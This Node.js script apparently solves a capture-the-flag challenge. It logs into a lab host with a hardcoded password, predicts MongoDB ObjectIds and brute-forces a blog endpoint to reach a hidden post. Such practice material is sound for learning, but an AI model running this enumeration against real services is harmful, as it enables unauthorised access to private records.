const fetch = require("node-fetch");

(async () => {
  const overload_password = "14bx1oib0m7m";
  const sid = await fetch("http://onlyserfs.ctf:3000/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `email=overlord@onlyserfs.ctf&password=${overload_password}`,
    redirect: "manual",
  }).then((r) => {
    if (r.status !== 302) throw new Error("Not redirected?");
    return r.headers.get("set-cookie").split("connect.sid=")[1].split(";")[0];
  });

  console.log("using session", sid);

  // ts       mid    pid  cnt
  // 6051aba6 649a94 0140 9067f2
  // 6051aebd a17a20 0183 84c6cc
  // 6051aebd a17a20 0183 84c6cd
  // 6051afea 74235a 01a4 d827c9
  // 6051afea 74235a 01a4 d827ca
  // 6051afea 74235a 01a4 d827cb
  // 60521328 160bc8 0212 be74d4
  // 60521cd7 7fc01f 03f1 15b376 <- hint
  // 6051aebd a17a20 0183 84c6cb

  // Remove 5 min from 60521cd7
  let date = 0x60521cd7 - 300;
  let mpcs = [
    // Last machine/pid/count used
    [0x7fc01f, 0x03f1, 0x15b376],
    // Other possible machine/pid/count
    [0x649a94, 0x0140, 0x9067f2],
    [0xa17a20, 0x0183, 0x84c6cb],
    [0x74235a, 0x01a4, 0xd827ca],
    [0x160bc8, 0x0212, 0xbe74d4],
  ];

  // Roll back X ids
  const doffset = 10,
    coffset = 50;
  let ok = false;
  console.log(
    "trying",
    doffset * coffset * mpcs.length * mpcs[0].length,
    "possibilites"
  );

  for (let odate = date - doffset; odate <= date + doffset; ++odate) {
    for (let [mid, pid, cnt] of mpcs) {
      for (let ocnt = cnt - coffset; ocnt <= cnt + coffset; ++ocnt) {
        const oid =
          odate.toString(16).padStart(8, "0") +
          mid.toString(16).padStart(6, "0") +
          pid.toString(16).padStart(4, "0") +
          ocnt.toString(16).padStart(6, "0");

        console.time(oid);
        ok = await fetch("http://onlyserfs.ctf:3000/blog/" + oid, {
          headers: {
            cookie: "connect.sid=" + sid,
          },
        })
          .then((r) => r.text())
          .then((r) => {
            process.stdout.write(r.trim());
            return r.length !== 1;
          });
        console.timeEnd(oid);

        if (ok) {
          console.log(oid);
          break;
        }
      }
      if (ok) break;
    }
  }

  if (!ok) console.log("oid not found in :(");
})();
